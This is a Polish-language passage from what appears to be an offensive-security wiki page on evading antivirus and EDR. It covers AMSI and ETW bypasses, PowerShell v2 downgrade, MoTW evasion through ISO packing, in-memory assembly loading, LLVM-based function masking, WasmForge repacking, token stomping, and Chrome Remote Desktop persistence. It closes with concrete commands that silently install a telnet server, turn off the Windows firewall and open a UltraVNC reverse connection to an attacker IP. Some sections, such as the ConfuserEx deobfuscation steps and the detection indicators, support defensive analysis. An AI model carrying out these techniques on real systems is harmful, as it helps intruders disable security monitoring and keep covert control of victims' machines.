Narzędzie **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** również generuje skrypty do omijania AMSI.
Narzędzie **[https://amsibypass.com/](https://amsibypass.com/)** również generuje skrypty do omijania AMSI, które unikają wykrycia przez sygnatury dzięki losowo generowanym funkcjom zdefiniowanym przez użytkownika, zmiennym i wyrażeniom znakowym oraz losowej zmianie wielkości liter w słowach kluczowych PowerShell.

**Usuń wykrytą sygnaturę**

Możesz użyć narzędzia takiego jak **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, aby usunąć wykrytą sygnaturę AMSI z pamięci bieżącego procesu. Narzędzie skanuje pamięć bieżącego procesu w poszukiwaniu sygnatury AMSI, a następnie nadpisuje ją instrukcjami NOP, skutecznie usuwając ją z pamięci.

**Produkty AV/EDR korzystające z AMSI**

Listę produktów AV/EDR korzystających z AMSI znajdziesz w **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Użyj PowerShell w wersji 2**
Jeśli użyjesz PowerShell w wersji 2, AMSI nie zostanie załadowany, więc możesz uruchamiać skrypty bez skanowania przez AMSI. Możesz to zrobić:

```bash
powershell.exe -version 2
```

## Logowanie PS

Logowanie PowerShell to funkcja umożliwiająca rejestrowanie wszystkich poleceń PowerShell wykonywanych w systemie. Może być przydatna do audytu i rozwiązywania problemów, ale może też **stanowić problem dla atakujących, którzy chcą uniknąć wykrycia**.

Aby ominąć logowanie PowerShell, możesz zastosować następujące techniki:

- **Wyłącz transkrypcję PowerShell i logowanie modułów**: Możesz w tym celu użyć narzędzia takiego jak [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Użyj PowerShell w wersji 2**: W PowerShell w wersji 2 AMSI nie zostanie załadowane, więc możesz uruchamiać skrypty bez skanowania ich przez AMSI. Możesz to zrobić tak: `powershell.exe -version 2`
- **Użyj niezarządzanej sesji PowerShell**: Użyj [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), aby uruchomić PowerShell bez uruchamiania `powershell.exe` (takie podejście stosuje `powerpick` w Cobalt Strike). Pozwala to ominąć mechanizmy kontroli powiązane konkretnie z procesem `powershell.exe`, ale samo w sobie nie wyłącza AMSI, Script Block Logging ani innych zabezpieczeń PowerShell; zakres ochrony zależy od środowiska uruchomieniowego i implementacji hosta.


## Obfuskacja

> [!TIP]
> Wiele technik obfuskacji opiera się na szyfrowaniu danych, co zwiększa entropię pliku binarnego i ułatwia wykrycie go przez AV i EDR. Zachowaj ostrożność i rozważ szyfrowanie tylko wybranych fragmentów kodu, które są wrażliwe lub wymagają ukrycia.

### Dekompilowanie plików binarnych .NET chronionych przez ConfuserEx

Podczas analizy malware wykorzystującego ConfuserEx 2 (lub jego komercyjne forki) często napotyka się kilka warstw ochrony, które blokują dekompilatory i sandboxy. Poniższy proces niezawodnie **przywraca kod IL niemal do oryginalnej postaci**, dzięki czemu można go następnie zdekompilować do C# za pomocą narzędzi takich jak dnSpy lub ILSpy.<sup>[[10]](#references)</sup>

1.  Usunięcie ochrony przed modyfikacją – ConfuserEx szyfruje każde *ciało metody* i odszyfrowuje je w statycznym konstruktorze *modułu* (`<Module>.cctor`). Modyfikuje również sumę kontrolną PE, więc każda zmiana spowoduje awarię pliku binarnego. Użyj **AntiTamperKiller**, aby odnaleźć zaszyfrowane tabele metadanych, odzyskać klucze XOR i zapisać czyste zestawienie:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output zawiera 6 parametrów anti-tamper (`key0-key3`, `nameHash`, `internKey`), które mogą być przydatne przy tworzeniu własnego unpackera.

2.  Odzyskiwanie symboli / przepływu sterowania – przekaż *czysty* plik do **de4dot-cex** (forka de4dot obsługującego ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flagi:
     • `-p crx` – wybiera profil ConfuserEx 2
     • de4dot cofnie spłaszczanie przepływu sterowania, przywróci oryginalne przestrzenie nazw, klasy i nazwy zmiennych oraz odszyfruje stałe ciągi znaków.

3.  Usuwanie proxy-call – ConfuserEx zastępuje bezpośrednie wywołania metod lekkimi wrapperami (tzw. *proxy calls*), aby jeszcze bardziej utrudnić dekompilację. Usuń je za pomocą **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Po tym kroku powinny być widoczne standardowe API .NET, takie jak `Convert.FromBase64String` lub `AES.Create()`, zamiast nieprzejrzystych funkcji opakowujących (`Class8.smethod_10`, …).

4.  Ręczne czyszczenie – uruchom wynikowy plik binarny w dnSpy i wyszukaj duże bloki Base64 lub użycie `RijndaelManaged`/`TripleDESCryptoServiceProvider`, aby znaleźć *prawdziwy* payload. Często malware przechowuje go jako tablicę bajtów zakodowaną w formacie TLV, inicjalizowaną w `<Module>.byte_0`.

Powyższy łańcuch przywraca przepływ wykonania **bez** konieczności uruchamiania złośliwej próbki – przydatne podczas pracy na stacji roboczej offline.

> 🛈  ConfuserEx tworzy atrybut niestandardowy o nazwie `ConfusedByAttribute`, którego można użyć jako IOC do automatycznej wstępnej selekcji próbek.

#### Jednolinijkowiec
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuscator C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest udostępnienie open-source’owego forka pakietu kompilacyjnego [LLVM](http://www.llvm.org/), który zwiększa bezpieczeństwo oprogramowania dzięki [obfuskacji kodu](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i zabezpieczeniom przed manipulacją.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator pokazuje, jak używać języka `C++11/14` do generowania obfuskowanego kodu na etapie kompilacji, bez korzystania z zewnętrznych narzędzi i bez modyfikowania kompilatora.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje warstwę obfuskowanych operacji generowanych przez framework metaprogramowania szablonów C++, co nieco utrudnia złamanie aplikacji.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz to obfuscator plików binarnych x64, który potrafi obfuskować różne pliki PE, w tym: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame to prosty silnik kodu metamorficznego dla dowolnych plików wykonywalnych.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator to framework do precyzyjnej obfuskacji kodu w językach obsługiwanych przez LLVM, wykorzystujący ROP (return-oriented programming). ROPfuscator obfuskowuje program na poziomie kodu asemblera, przekształcając zwykłe instrukcje w łańcuchy ROP, co podważa nasze naturalne wyobrażenie o zwykłym przepływie sterowania.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt to napisany w Nim .NET PE Crypter.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor potrafi konwertować istniejące pliki EXE/DLL do postaci shellcode, a następnie je ładować.

### Samomaskowanie poszczególnych funkcji wspomagane przez kompilator LLVM

Zamiast maskować cały implant tylko podczas uśpienia, zmodyfikowany backend LLVM X86 może utrzymywać wybrane funkcje w postaci zamaskowanej operacją XOR, gdy są nieaktywne. PoC Function Peekaboo wybiera zdemanglowane nazwy zawierające `REG_`, wstawia niezależne od położenia stuby wejścia/wyjścia wokół końcowego kodu maszynowego i emituje jeden wspólny handler maskowania w `.text`; sygnatury na poziomie źródłowym i konwencja wywołań Windows x64 pozostają bez zmian.<sup>[[38]](#references)[[39]](#references)</sup>

#### Transformacja przepływu sterowania w backendzie

Transformacja powinna nastąpić po wyborze instrukcji i optymalizacji, ponieważ musi objąć **każdy wygenerowany rozkaz powrotu** i znać dokładny układ kodu x86. Uruchamiany przed emisją `MachineFunctionPass` znajduje ostatnią instrukcję `MachineInstr::isReturn()`, usuwa ją, aby ostatnia ścieżka przechodziła dalej do dołączonego epilogu, a wcześniejsze instrukcje powrotu zastępuje przez `JMP_1 handler`. Zachowaj wszelkie wygenerowane przez kompilator instrukcje zwalniania stosu/ramki poprzedzające każdy powrót; przekieruj wyłącznie samą instrukcję powrotu.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` i `X86AsmPrinter::emitFunctionBodyEnd()` emitują stuby dla poszczególnych funkcji, a `emitEndOfAsmFile()` emituje handler. Symbole współdzielone między etapami emisji umożliwiają skokowi w prologu wskazanie późniejszego epilogu; aby ręcznie wyemitować bliskie `je`, zapisz `0F 84`, a następnie czterobajtowe wyrażenie MC `target - address_after_je`. Wywołania i skoki do handlera można natomiast emitować jako obiekty `MCInst` (`CALL64pcrel32` i `JMP_1`). Pass musi zwrócić `false` dla niewybranej funkcji, jeśli niczego nie zmienił; PoC błędnie zwraca w tej sytuacji `true`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadane i inicjalizacja przed CRT

PoC umieszcza klucz XOR i 16-bajtowe rekordy zawierające relokowany przez loader wskaźnik funkcji oraz długość ustalaną w czasie działania. Mimo że pole w C ma typ `uint32_t`, handler odczytuje QWORD z przesunięcia `+8` w rekordzie, obejmując długość i jej padding, a następnie przesuwa się o `0x10` bajtów do kolejnych rekordów. Nazwy sekcji PE mogą mieć najwyżej osiem bajtów, dlatego wyszukiwanie w czasie działania znajduje `.funcmet`. Zewnętrzny patcher dodaje wykonywalną sekcję `.stub`, zapisuje w niej poprzednie RVA punktu wejścia i przekierowuje `AddressOfEntryPoint`; stub PIC pobiera bazę obrazu z `gs:[0x60]` → `[PEB+0x10]`, przechodzi po importach PE32+, aby rozwiązać już zaimportowaną funkcję `VirtualProtect`, i uruchamia się przed CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Podczas inicjalizacji ustawiany jest znacznik w `gs:[0xE8]` i wywoływana jest każda funkcja z metadanych. Zawsze czytelny prolog zapisuje początek funkcji w `gs:[0xF0]`, wykrywa znacznik i pomija jej jeszcze niezamaskowane ciało. Epilog używa następnie `call handler`; po zapisaniu przez handler 13 rejestrów (`0x68` bajtów) adres powrotu pod `[rsp+0x68]` wskazuje koniec przekształconej funkcji, więc `end - start` można zapisać w jej rekordzie metadanych. Po zamaskowaniu wszystkich ciał stub czyści znacznik i wykonuje skok do `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Podczas zwykłego wywołania prolog wywołuje ten sam symetryczny handler, aby zdekodować ciało funkcji. Ostatnia ścieżka przechodzi dalej do dołączonego epilogu, a każdy wcześniejszy rozkaz powrotu skacze bezpośrednio do wspólnego handlera. Zwykły epilog używa również `jmp handler`, a nie `call`, dzięki czemu po ponownym zamaskowaniu instrukcja `ret` handlera pobiera adres powrotu pierwotnego wywołującego, zachowując wynik funkcji w `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Prymityw maskowania i wskaźniki analityczne

Handler odnajduje bieżący rekord, pomija stały, widoczny prolog (w tej kompilacji `0x46` bajtów), zmienia ochronę pozostałej części na `PAGE_EXECUTE_READWRITE`, wykonuje XOR każdego bajtu z najmłodszym bajtem klucza, a następnie ustawia ochronę na `PAGE_EXECUTE_READ`. Ta sama pętla dekoduje więc ciało przy wejściu i koduje je przy każdym zwykłym wyjściu.<sup>[[38]](#references)[[39]](#references)</sup>

Charakterystyczne wskaźniki tego rozwiązania to:<sup>[[38]](#references)[[39]](#references)</sup>

- punkt wejścia w wykonywalnej sekcji `.stub` oraz sekcja `.funcmet` zawierająca klucz i relokowane wskaźniki do `.text`;
- parsowanie PEB, tablicy importów i tablicy sekcji przed CRT, po którym następują wywołania przez każdy wskaźnik z metadanych;
- identyczne prologi PIC w postaci `call`/`pop` oraz liczne miejsca powrotu przekierowane do jednego handlera;
- zapisy do `gs:[0xE8]`, `gs:[0xF0]` i `gs:[0xF8]`, po których następują powtarzające się zmiany ochrony przez `VirtualProtect` i bajtowe operacje XOR zapisujące do wykonywalnych stron obrazu.

To obejście skanerów pamięci, a nie ochrona kryptograficzna: spatchowany plik nadal zawiera oryginalne, niezaszyfrowane ciało funkcji, a debugger może zatrzymać wykonanie na `VirtualProtect` lub pętli XOR i zrzucić aktywną funkcję. Jednobajtowy XOR, czytelne metadane i stała granica `0x46` ułatwiają też odzyskanie kodu offline.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Sloty TEB w PoC są lokalne dla wątku, ale zmodyfikowane strony kodu są współdzielone przez cały proces. Równoczesne lub rekurencyjne wejście może więc ponownie przełączać instrukcje podczas wykonywania ich przez inne wywołanie; wyjątki i nielokalne wyjścia również mogą ominąć ponowne maskowanie. Solidna implementacja musi synchronizować zmiany, przywracać ochronę faktycznie zwróconą przez `lpflOldProtect`, unikać zakodowanych na stałe długości stubów, sprawdzić ścieżki zarówno `call`, jak i `jmp` pod kątem wyrównania stosu x64 oraz wywoływać `FlushInstructionCache` po modyfikacji wykonywalnych bajtów. Microsoft wyraźnie nakłada na wywołującego odpowiedzialność za spójność pamięci podręcznej instrukcji po modyfikacji wykonywalnego kodu.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Być może widziałeś ten ekran podczas pobierania niektórych plików wykonywalnych z internetu i ich uruchamiania.

Microsoft Defender SmartScreen to mechanizm bezpieczeństwa, który ma chronić użytkownika końcowego przed uruchamianiem potencjalnie złośliwych aplikacji.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen działa głównie w oparciu o reputację, co oznacza, że rzadko pobierane aplikacje wywołają SmartScreen, który ostrzeże użytkownika końcowego i uniemożliwi mu uruchomienie pliku (plik nadal można uruchomić, klikając More Info -> Run anyway).

**MoTW** (Mark of The Web) to [alternatywny strumień danych NTFS](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) o nazwie Zone.Identifier, tworzony automatycznie przy pobieraniu plików z internetu wraz z adresem URL, z którego plik został pobrany.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Sprawdzanie ADS Zone.Identifier dla pliku pobranego z internetu.</p></figcaption></figure>

> [!TIP]
> Warto pamiętać, że pliki wykonywalne podpisane **zaufanym** certyfikatem podpisu **nie wywołają SmartScreen**.

Bardzo skutecznym sposobem na zapobieganie nadawaniu payloadom znacznika Mark of The Web jest umieszczenie ich w jakimś kontenerze, na przykład ISO. Dzieje się tak, ponieważ znacznika Mark-of-the-Web (MOTW) **nie można** zastosować do woluminów **innych niż NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) to narzędzie, które pakuje payloady do kontenerów wynikowych, aby ominąć Mark-of-the-Web.

Przykładowe użycie:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

To demo omijania SmartScreen przez pakowanie payloadów w plikach ISO za pomocą [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) to potężny mechanizm rejestrowania zdarzeń w systemie Windows, który pozwala aplikacjom i składnikom systemu **rejestrować zdarzenia**. Mogą go jednak używać również produkty zabezpieczające do monitorowania i wykrywania złośliwych działań.

Podobnie jak można wyłączyć (obejść) AMSI, można też sprawić, by funkcja **`EtwEventWrite`** procesu działającego w przestrzeni użytkownika natychmiast zwracała wynik bez rejestrowania zdarzeń. Osiąga się to przez załatanie funkcji w pamięci tak, aby natychmiast zwracała wynik, co skutecznie wyłącza logowanie ETW dla tego procesu.

Więcej informacji znajdziesz w **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) i [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## Refleksja zestawów C#

Ładowanie plików binarnych C# do pamięci jest znane od dawna i nadal stanowi świetny sposób na uruchamianie narzędzi post-exploitation bez wykrycia przez AV.

Ponieważ payload zostanie załadowany bezpośrednio do pamięci, bez zapisywania na dysku, musimy jedynie zadbać o załatanie AMSI dla całego procesu.

Większość frameworków C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc itp.) umożliwia już wykonywanie zestawów C# bezpośrednio w pamięci, ale można to zrobić na różne sposoby:

- **Fork\&Run**

Polega to na **uruchomieniu nowego procesu ofiarnego**, wstrzyknięciu do niego złośliwego kodu post-exploitation, wykonaniu tego kodu, a po zakończeniu — zabiciu nowego procesu. Ta metoda ma zarówno zalety, jak i wady. Jej zaletą jest to, że wykonanie odbywa się **poza** procesem naszego implantu Beacon. Oznacza to, że jeśli podczas działania post-exploitation coś pójdzie nie tak lub zostaniemy wykryci, **znacznie wzrasta szansa**, że nasz **implant przetrwa**. Wadą jest **większa szansa** wykrycia przez **detekcje behawioralne**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Polega to na wstrzyknięciu złośliwego kodu post-exploitation **do własnego procesu**. Dzięki temu nie trzeba tworzyć nowego procesu, który zostałby przeskanowany przez AV. Wadą jest to, że jeśli podczas wykonywania payloadu coś pójdzie nie tak, **znacznie wzrasta szansa** na **utratę beacona**, ponieważ proces może ulec awarii.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Jeśli chcesz dowiedzieć się więcej o ładowaniu zestawów C#, zapoznaj się z tym artykułem [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) oraz ich BOF-em InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Zestawy C# można też ładować **z PowerShella** — sprawdź [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [film S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Przepakowywanie narzędzi .NET do WebAssembly za pomocą NativeAOT (WasmForge)

Standardowe techniki `execute-assembly` zachowują rozpoznawalny kod MSIL i ostatecznie inicjują CLR. **WasmForge** zmienia zamiast tego środowisko wykonawcze: przenosi projekt C# na eksperymentalny cel NativeAOT-LLVM WASI, kompiluje go z wyprzedzeniem do WebAssembly i osadza ten moduł w hoście PE dla systemu Windows opartym na Wazero. Wynikowy proces nie wymaga CLR, JIT ani hosta `dotnet` na komputerze docelowym, dlatego reguły bazujące wyłącznie na nazwach zestawów zarządzanych, ładowaniu CLR, AMSI lub .NET ETW tracą bezpośrednią widoczność. Jest to technika unikania wykrycia i pakowania, a nie obejście granicy uprawnień — kod gościa zachowuje uprawnienia oryginalnego narzędzia i jego widoczne zachowanie w systemie operacyjnym.<sup>[[44]](#references)[[45]](#references)</sup>

### Budowanie projektu C#

Zalecaną metodą budowania jest środowisko Docker projektu, które zawiera .NET 10 SDK, workload NativeAOT-LLVM, WASI SDK 24.0, linker i zależności do podpisywania. Plik `.csproj` jest wykrywany automatycznie; jednorazowy proces budowania wykonuje migrację, poprawki zgodności, kompilację WASM, tworzenie pliku PE i podpisywanie.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

W celu rozwiązywania problemów lub przeglądania wygenerowanego kodu podziel proces na `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` oraz końcowe `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Obraz kompilacyjny używa też wrappera `wasm-component-ld`, aby uniknąć kodowania komponentów WASI Preview 2 i wygenerować zwykły moduł, którego oczekuje osadzony runtime.<sup>[[44]](#references)[[45]](#references)</sup>

### Łączenie wasm32 C# z x64 Win32

To nie jest przezroczysta rekompilacja. NativeAOT-WASI nie obsługuje niektórych funkcji BCL ukierunkowanych na Windows lub zmienia ich działanie, a gość wasm32 zwykle przydziela czterobajtowe sloty na wskaźniki, podczas gdy API x64 mogą zwracać wskaźniki ośmiobajtowe. WasmForge rozwiązuje oba problemy za pomocą następujących generowanych warstw:<sup>[[44]](#references)</sup>

1. Patcher kodu źródłowego naprawia różnice semantyczne specyficzne dla AOT i przekierowuje nieobsługiwane wywołania dotyczące rejestru, potoków, WMI, tożsamości, usług katalogowych, wersji plików, LSA i podobnych funkcji do helperów `Wf*`.
2. Skaner P/Invoke generuje mapowania NativeAOT `DirectPInvoke`, dzięki czemu wywołania `[DllImport]` są wiązane z połączonymi symbolami mostka C zamiast dynamicznie ładować zadeklarowaną bibliotekę DLL wewnątrz gościa.
3. Wskaźniki kierowane do hosta używają `ulong` w C# i `uint64_t` w C. Ogólny dispatcher przekazuje wywołanie do obsługi Win32 hosta; `out8_mask` oznacza rzeczywiste ośmiobajtowe sloty wyjściowe, których górne połowy muszą zostać zachowane. W przypadku nieoznaczonych danych wyjściowych w formacie wasm32 stosowana jest ochrona snapshot/restore, aby zapis x64 nie uszkodził sąsiednich czterech bajtów.
4. Dedykowane mostki hosta obsługują operacje, które nie pasują do ogólnego dispatchingu syscalli, takie jak dostęp do pamięci podręcznej biletów LSA, operacje Kerberos/BCrypt ze strukturalnymi wynikami, ruch TCP KDC i zapytania LDAP.

Na przykład wrapper dla `version.dll!VerQueryValueW` przekazuje cztery adresy hosta i ustawia bity 2 i 3 (`0xC`), ponieważ wskaźnik wartości i długość to ośmiobajtowe sloty wyjściowe. Sam wrapper pozostaje ogólny i przekazuje nazwę DLL, nazwę exportu, argumenty oraz maskę do `wf_call_v2`; host wykonuje translację wskaźników i wywołuje natywne API.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Ograniczenia i sygnały wykrywania

Kod intensywnie korzystający z refleksji, dynamiczne ładowanie assembly, dowolne natywne callbacki i złożone struktury x64 zwracane do pamięci WASM mogą nadal wymagać poprawek dla poszczególnych narzędzi albo w ogóle nie działać. Ogólne gniazda WASI Preview 2 mogą też trafiać do pustych stubów, dlatego obsługiwane narzędzia korzystają z shimów hosta specyficznych dla danego protokołu. Weryfikuj każde polecenie względem kompilacji natywnej, zamiast zakładać równoważność funkcji.<sup>[[44]](#references)[[45]](#references)</sup>

Ta technika zmienia telemetrię, zamiast czynić payload niewidocznym. Wykrywanie może skupić się na pliku PE zawierającym lub materializującym moduł WASM, zachowaniu przypominającym runtime Wazero, nietypowym przydzielaniu i kopiowaniu pamięci hosta/gościa, ogólnym bezpośrednim wywoływaniu Win32, anomaliach związanych z podpisami i zasobami PE, a także wynikowych wywołaniach API i ruchu sieciowym. Braku zdarzeń CLR-load, AMSI lub .NET ETW nie należy więc traktować jako dowodu, że proces jest nieszkodliwy.<sup>[[44]](#references)</sup>

## Używanie innych języków programowania

Jak zaproponowano w [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), można wykonywać złośliwy kod w innych językach, zapewniając zaatakowanej maszynie dostęp **do środowiska interpretera zainstalowanego na udziale SMB kontrolowanym przez atakującego**.

Zapewniając dostęp do plików binarnych interpretera i środowiska na udziale SMB, można **wykonywać dowolny kod w tych językach w pamięci** zaatakowanej maszyny.

Repozytorium wskazuje: Defender nadal skanuje skrypty, ale korzystając z Go, Java, PHP itp., zyskujemy **większą elastyczność w omijaniu sygnatur statycznych**. Testy z losowymi, nieobfuskowanymi skryptami reverse shell w tych językach zakończyły się powodzeniem.

## Ponowne hostowanie WebAssembly w celu uniknięcia analizy statycznej

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping manipuluje tokenem dostępu produktu zabezpieczającego, takiego jak EDR lub AV. Ograniczenie uprawnień tokenu może sprawić, że proces będzie nadal działał, ale nie będzie mógł wykonywać uprzywilejowanych działań inspekcyjnych ani naprawczych.

Aby temu zapobiec, Windows mógłby **uniemożliwiać zewnętrznym procesom** uzyskiwanie uchwytów do tokenów procesów zabezpieczających.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Używanie zaufanego oprogramowania

### Chrome Remote Desktop

Jak opisano w [**tym wpisie na blogu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), łatwo jest po prostu wdrożyć Chrome Remote Desktop na komputerze ofiary, a następnie użyć go, aby przejąć nad nim kontrolę i utrzymać persistence:<sup>[[35]](#references)</sup>
1. Pobierz plik ze strony https://remotedesktop.google.com/, kliknij „Set up via SSH”, a następnie kliknij plik MSI dla Windows, aby go pobrać.
2. Uruchom instalator po cichu na komputerze ofiary (wymagane uprawnienia administratora): `msiexec /i chromeremotedesktophost.msi /qn`
3. Wróć na stronę Chrome Remote Desktop i kliknij „Next”. Kreator poprosi o autoryzację; kliknij przycisk „Authorize”, aby kontynuować.
4. Wykonaj dostarczone polecenie z wymaganymi zmianami: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parametr `--pin` ustawia PIN bez użycia GUI).
 

## Zaawansowane techniki unikania wykrycia

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Unikanie wykrycia to bardzo złożony temat; czasami trzeba uwzględnić wiele różnych źródeł telemetrii w jednym systemie, dlatego pozostanie całkowicie niewykrytym w dojrzałych środowiskach jest praktycznie niemożliwe.

Każde środowisko, w którym działasz, ma własne mocne i słabe strony.

Gorąco zachęcam do obejrzenia tego wystąpienia [@ATTL4S](https://twitter.com/DaniLJ94), aby poznać podstawy bardziej zaawansowanych technik unikania wykrycia.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

To również świetne wystąpienie [@mariuszbit](https://twitter.com/mariuszbit) na temat wielowarstwowego unikania wykrycia.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Stare techniki**

### **Sprawdzenie, które elementy Defender uznaje za złośliwe**

Możesz użyć [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), które będzie **usuwać fragmenty pliku binarnego**, aż **ustali, który fragment Defender** uznaje za złośliwy, a następnie go wyodrębni.\
Innym narzędziem robiącym **to samo jest** [**avred**](https://github.com/dobin/avred), które udostępnia tę usługę w internecie pod adresem [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Serwer Telnet**

Do Windows 10 wszystkie wersje Windows zawierały **serwer Telnet**, który można było zainstalować (jako administrator), wykonując:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Niech **uruchamia się** podczas uruchamiania systemu i **uruchom** go teraz:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Zmień port telnet (stealth) i wyłącz firewall:**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Pobierz z: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (potrzebujesz plików binarnych do pobrania, a nie instalatora)

**NA HOŚCIE**: Uruchom _**winvnc.exe**_ i skonfiguruj serwer:

- Włącz opcję _Disable TrayIcon_
- Ustaw hasło w _VNC Password_
- Ustaw hasło w _View-Only Password_

Następnie przenieś plik binarny _**winvnc.exe**_ oraz **nowo** utworzony plik _**UltraVNC.ini**_ na **komputer ofiary**

#### **Reverse connection**

**Atakujący** powinien **uruchomić na swoim** **hoście** plik binarny `vncviewer.exe -listen 5900`, aby był **gotowy** do odebrania zwrotnego **połączenia VNC**. Następnie na **komputerze ofiary**: Uruchom demona winvnc poleceniem `winvnc.exe -run` i wykonaj `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**OSTRZEŻENIE:** Aby zachować dyskrecję, nie rób kilku rzeczy:

